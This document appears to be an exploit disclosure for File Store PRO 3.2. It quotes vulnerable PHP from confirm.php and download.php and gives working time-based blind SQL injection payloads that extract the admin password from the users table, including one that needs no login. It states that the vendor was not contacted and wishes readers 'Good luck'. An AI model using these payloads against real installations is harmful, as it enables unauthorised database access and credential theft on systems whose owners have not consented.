File Store PRO 3.2 Multiple Blind SQL Injection Vulnerabilities
===============================================================



 ________________________________________
| File Store PRO 3.2 Blind SQL Injection |
|________________________________________|



- Need admin rights:
/confirm.php:
[code]

if(isset($_GET["folder"]) && $_GET["folder"]!="") {
 $folder=$_GET["folder"];
} else {
  exit("Bad Request");
 }
if(isset($_GET["id"]) && $_GET["id"]!="") {
 $id=$_GET["id"];
} else {
  exit("Bad Request");
 }

// Validate all inputs
// Added by SepedaTua on June 01, 2006 - http://www.sepedatua.info/
/********************** SepedaTua ****************************/

/* Fields:
$folder
$id
*/
$search = array (&#039;@<script[^>]*?>.*?</script>@si&#039;,
                &#039;@<[\/\!]*?[^<>]*?>@si&#039;,
                &#039;@([\r\n])[\s]+@&#039;,
                &#039;@&(quot|#34);@i&#039;,
                &#039;@&(amp|#38);@i&#039;,
                &#039;@&(lt|#60);@i&#039;,
                &#039;@&(gt|#62);@i&#039;,
                &#039;@&(nbsp|#160);@i&#039;,
                &#039;@&(iexcl|#161);@i&#039;,
                &#039;@&(cent|#162);@i&#039;,
                &#039;@&(pound|#163);@i&#039;,
                &#039;@&(copy|#169);@i&#039;,
                &#039;@&#(\d+);@e&#039;);

$replace = array (&#039;&#039;,
                 &#039;&#039;,
                 &#039;\1&#039;,
                 &#039;"&#039;,
                 &#039;&&#039;,
                 &#039;<&#039;,
                 &#039;>&#039;,
                 &#039; &#039;,
                 chr(161),
                 chr(162),
                 chr(163),
                 chr(169),
                 &#039;chr(\1)&#039;);

$ffolder = $folder;
$fid = $id;


-----

$SQL="SELECT `".DB_PREFIX."users`.*, `".DB_PREFIX."file_list`.`filename`, `".DB_PREFIX."file_list`.`descript` ";
$SQL.=" FROM `".DB_PREFIX."file_list` LEFT JOIN `".DB_PREFIX."users` ON `".DB_PREFIX."file_list`.`user_id`=`".DB_PREFIX."users`.`id`";
$SQL.=" WHERE `".DB_PREFIX."file_list`.`id`=&#039;".$id."&#039;";
if(!$mysql->query($SQL))
{
 exit($mysql->error);
}
if($mysql->num<=0)
{
 exit("Record not found");
} 
[/code]

POC: 
&#039; UNION SELECT IF (SUBSTRING(password, 1, 1)=&#039;a&#039;, BENCHMARK(100000000, ENCODE(&#039;a&#039;,&#039;b&#039;)), 1 ),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from fstore_users where login=&#039;admin 
Site: http://site.xxx/confirm.php?folder=a&id=[SQL]

- Don&#039;t need admin rights:
In /download.php:
[code]
if(!isset($_GET["sig"])) // direct download, no need to login
$MustLogin=1|2|4;
require_once("libs/header.php");
if(!isset($_GET["sig"])) // direct download, no need to login
$userlevel=$CurUser->getlevel();
$SQL="SELECT * FROM `".DB_PREFIX."file_list` WHERE `id`=&#039;".$fileid."&#039;";
if(!$mysql->query($SQL))
{
 exit($mysql->error);
} 
[/code]

POC:
&#039; UNION SELECT IF (SUBSTRING(password, 1, 1)=&#039;a&#039;, BENCHMARK(100000000, ENCODE(&#039;a&#039;,&#039;b&#039;)), 1 ),2,3,4,5,6,7,8,9,10,11 from fstore_users where login=&#039;admin
Site: 
http://site.xxx/download.php?id=[SQL] 

Needs magic_quotes_gpc=off. Vendor not contacted !

Good luck !

--------------------------------------------------------------------





